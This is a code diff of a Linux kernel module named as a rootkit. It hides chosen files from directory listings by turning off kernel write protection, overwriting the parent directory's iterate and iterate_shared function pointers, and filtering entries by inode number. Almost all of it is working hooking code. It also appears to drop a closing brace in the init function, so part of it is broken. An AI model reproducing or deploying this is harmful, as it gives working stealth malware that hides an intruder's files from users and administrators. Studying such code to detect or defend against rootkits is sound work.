@@ -325,17 +325,28 @@ struct file_operations fops ={
 // Runtime var
 struct dentry* g_parent_dentry;
 filldir_t original_filldir;
+unsigned long g_inode_num;
 int (*original_iterate)(struct file *, struct dir_context *);
+int (*original_iterate_shared)(struct file *, struct dir_context *);
+
+
 const struct file_operations *original_parent_fops;
 // List
 struct inode_to_hide {
   unsigned long inode_number;
-  void* parent_inode_pointer;
-  void* old_parent_fop; 
   struct list_head list;
 };
 
 LIST_HEAD(inode_to_hide_list);
+int add_inode(unsigned long ino){
+  struct inode_to_hide* inode_entry = (struct inode_to_hide*) kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL);
+  if (!inode_entry)
+    return 0;
+  inode_entry->inode_number = ino;
+  list_add(&inode_entry->list, &inode_to_hide_list);
+  return SUCCESS;
+}
+
 
 static int new_parent_filldir(struct dir_context* context,
 			      const char* name,
@@ -343,22 +354,15 @@ static int new_parent_filldir(struct dir_context* context,
 			      loff_t offset,
 			      u64 ino,
 			      unsigned int d_type){
-  printk(KERN_INFO "New filldir\n");
-  /* struct dentry* p_dentry; */
-  /* struct qstr current_name; */
-  /* struct inode_to_hide* p; */
-  /* current_name.name = name; */
-  /* current_name.len = namelen; */
-  /* current_name.hash = full_name_hash (NULL, name, namelen); */
-  /* p_dentry = d_lookup(g_parent_dentry, &current_name); */
-
-  /* /\* if (p_dentry!=NULL){ *\/ */
-  /* /\*   for(i = 0; i<= g_inode_count - 1; i++){ *\/ */
-  /* /\*     if (g_inode_numbers[i] == p_dentry->d_inode->i_ino) *\/ */
-  /* /\* 	return 0; *\/ */
-  /* /\*   } *\/ */
-  /* /\* } *\/ */
-
+  //  printk(KERN_INFO "New filldir\n");
+  // printk(KERN_INFO "name: %s, namelen: %d, ino: %ld\n", name, namelen, ino);
+  // printk(KERN_INFO "inode to hide: %ld", g_inode_num);
+  struct inode_to_hide *p;
+  list_for_each_entry(p, &inode_to_hide_list, list){
+    if(ino == p -> inode_number)
+      return 0;
+  }
+  
   /* // Search in list */
   /* if(p_dentry != NULL){ */
   /*   list_for_each_entry(p, &inode_to_hide_list, list){ */
@@ -375,10 +379,10 @@ static int new_parent_iterate(struct file *, struct dir_context *);
 static struct file_operations new_parent_fops = {
 						 .iterate = new_parent_iterate,
 };
-int (*original_iterate)(struct file *file, struct dir_context *context);
+
 
 static int new_parent_iterate(struct file *file, struct dir_context *context){
-  printk(KERN_INFO "New iterate!!!!!!!!!\n");
+  //printk(KERN_INFO "New iterate!!!!!!!!!\n");
   int ret = 0;
   //printk(KERN_INFO "f_op -> iterate: %p\n", file->f_op->iterate);
   //printk(KERN_INFO "original_iterate: %p\n", original_iterate);
@@ -403,8 +407,16 @@ static int new_parent_iterate(struct file *file, struct dir_context *context){
   return original_iterate(file,context);
   //return 0;
 }
+static int new_parent_iterate_shared(struct file *file, struct dir_context *context){
+  printk(KERN_INFO "New iterate shared!!!!!!!!!\n");
+  original_filldir = context->actor;
+  *((filldir_t*)&context->actor) = new_parent_filldir;
+  
+  return original_iterate_shared(file,context);
+  //return 0;
+}
 
-	  
+// Doesn't work anymore	  
 #define DISABLE_W_PROTECTED_MEMORY		\
   do {						\
     preempt_disable();				\
@@ -415,6 +427,7 @@ static int new_parent_iterate(struct file *file, struct dir_context *context){
     preempt_enable();				\
     write_cr0(read_cr0() | 0x10000);		\
   } while (0);
+
 static inline void
 write_cr0_forced(unsigned long val)
 {
@@ -442,60 +455,43 @@ unprotect_memory(void)
 }
 static int hide_file_hook (const char* file_path){
   int error = 0;
-  //struct file* file;
-
   struct path path;
-  struct inode_to_hide* inode_entry;
-  /* error = kern_path("/", LOOKUP_FOLLOW, &g_root_path); */
-  /* if(error){ */
-  /*   printk( KERN_ALERT "Can't access root\n"); */
-  /*   return -1; */
-  /* } */
+  
   printk(KERN_INFO "hooking fop file: %s\n", file_path);
   error = kern_path(file_path, LOOKUP_FOLLOW, &path);
   if (error){
     printk( KERN_ALERT "Can't access file\n");
     return -1;
   }
-  /* printk(KERN_INFO "Got inode: %ld", path.dentry->d_inode->i_ino); */
-  /* if ((file = filp_open(file_path, O_RDONLY, 0)) == NULL) { */
-  /*       return -1; */
-  /* } */
   
-  // Save inode
-  /* inode_entry = kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL); */
-  /* if(!inode_entry) */
-  /*   return -1; */
-  
-  /* inode_entry->inode_number = path.dentry->d_inode->i_ino; */
-  /* inode_entry->old_parent_fop = path.dentry->d_parent->d_inode->i_fop; */
-  /* inode_entry->parent_inode_pointer = path.dentry->d_parent->d_inode; */
-
-  /* list_add(&inode_entry->list, &inode_to_hide_list); */
-  
-  // Hooking fop of parent
-  //DISABLE_W_PROTECTED_MEMORY
-  //original_iterate = path.dentry->d_parent->d_inode->i_fop->iterate;
-  
+  //  g_inode_num = path.dentry->d_inode->i_ino;
+  //  add_inode(path.dentry->d_inode->i_ino);
   g_parent_dentry = path.dentry->d_parent;
-  //original_parent_fops = g_parent_dentry->d_inode->i_fop;
-  //original_iterate = g_parent_dentry->d_inode->i_fop->iterate;
-  //  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
-  //DISABLE_W_PROTECTED_MEMORY
+  original_iterate = g_parent_dentry->d_inode->i_fop->iterate;
+  original_iterate_shared = g_parent_dentry->d_inode->i_fop->iterate_shared;
+
+  printk(KERN_INFO "original_iterate: %p\n", original_iterate);
+  printk(KERN_INFO "original_iterate_shared: %p\n", original_iterate_shared);
   printk(KERN_INFO "new_parent_iterate: %p\n",&new_parent_iterate);
+  printk(KERN_INFO "new_parent_iterate_shared: %p\n",&new_parent_iterate_shared);
+
+  printk(KERN_INFO "BEFORE:\n");
   printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
-
-
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n", g_parent_dentry->d_inode->i_fop->iterate_shared);
+    
   unprotect_memory();
+  unsigned long ** ptr = (unsigned long **) &g_parent_dentry->d_inode->i_fop->iterate;
+  unsigned long ** ptr2 =  (unsigned long **) &g_parent_dentry->d_inode->i_fop->iterate_shared;
 
-  unsigned long * ptr = (unsigned long *) &g_parent_dentry->d_inode->i_fop->iterate;
-  //printk(KERN_INFO "ptr: %p\n",ptr);
-  *ptr = (unsigned long *) &new_parent_iterate; 
+  *ptr = (unsigned long *) &new_parent_iterate;
+  *ptr2 = (unsigned long *) &new_parent_iterate_shared;
+  //*ptr2 = NULL;
   //g_parent_dentry->d_inode->i_fop->iterate = &new_parent_iterate;
-  //ENABLE_W_PROTECTED_MEMORY;
   protect_memory();
   //printk(KERN_INFO "ptr: %p\n",*ptr);
+  printk(KERN_INFO "AFTER:\n");
   printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n", g_parent_dentry->d_inode->i_fop->iterate_shared);
   
   //path.dentry->d_parent->d_inode->i_fop->iterate = &new_parent_iterate;
   //ENABLE_W_PROTECTED_MEMORY
@@ -509,20 +505,39 @@ static int hide_file_hook (const char* file_path){
 
 static int backup_hooks (void){
   struct inode_to_hide  *p, *tmp;
-  struct inode* p_inode;
-  list_for_each_entry(p, &inode_to_hide_list, list){
-    p_inode = p->parent_inode_pointer;
-    p_inode->i_fop = p->old_parent_fop;
-  }
-  msleep(10);
+  
   list_for_each_entry_safe(p, tmp, &inode_to_hide_list, list ){
     list_del(&p->list);
     kfree(p);
   }
+  printk(KERN_INFO "Restoring hook\n");
+  printk(KERN_INFO "original_iterate: %p\n", original_iterate);
+  printk(KERN_INFO "original_iterate_shared: %p\n", original_iterate_shared);
+  printk(KERN_INFO "new_parent_iterate: %p\n",&new_parent_iterate);
+  printk(KERN_INFO "new_parent_iterate_shared: %p\n",&new_parent_iterate_shared);
+
+  printk(KERN_INFO "BEFORE:\n");
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n", g_parent_dentry->d_inode->i_fop->iterate_shared);
+
+
+  unprotect_memory();
+  unsigned long ** ptr = (unsigned long **) &g_parent_dentry->d_inode->i_fop->iterate;
+  unsigned long ** ptr2 =  (unsigned long **) &g_parent_dentry->d_inode->i_fop->iterate_shared;
+
+  *ptr = (unsigned long *) original_iterate;
+  *ptr2 = (unsigned long *) original_iterate_shared;
+  
+  protect_memory();
+  printk(KERN_INFO "AFTER:\n");
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
+  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n", g_parent_dentry->d_inode->i_fop->iterate_shared);
+
+  
   return SUCCESS;
 }
 
-static char* test_path_name = "/home/dalo2903/Test/test.c";
+static char* test_path_name = "/home/dalo2903/test.c";
 
 // Rootkit init & exit
 static int __init rootkit_init(void)
@@ -534,13 +549,13 @@ static int __init rootkit_init(void)
     printk(KERN_ALERT "Hook failed\n");
     return ret_val;
   }
- 
+  
   ret_val = register_chrdev(MAJOR_NUM, DEVICE_FILE_NAME, &fops);
   if (ret_val < 0) {
     printk(KERN_ALERT "%s failed with %d\n",
 	   "Sorry, registering the character device\n ", ret_val);
     return ret_val;
-  }
+  
 
   printk(KERN_INFO "%s The major device number is %d.\n",
 	 "Registeration is a success", MAJOR_NUM);
@@ -551,7 +566,7 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-  // backup_hooks();
+  backup_hooks();
   unregister_chrdev(MAJOR_NUM, DEVICE_FILE_NAME);
   
   printk(KERN_INFO "Rootkit unloaded\n");
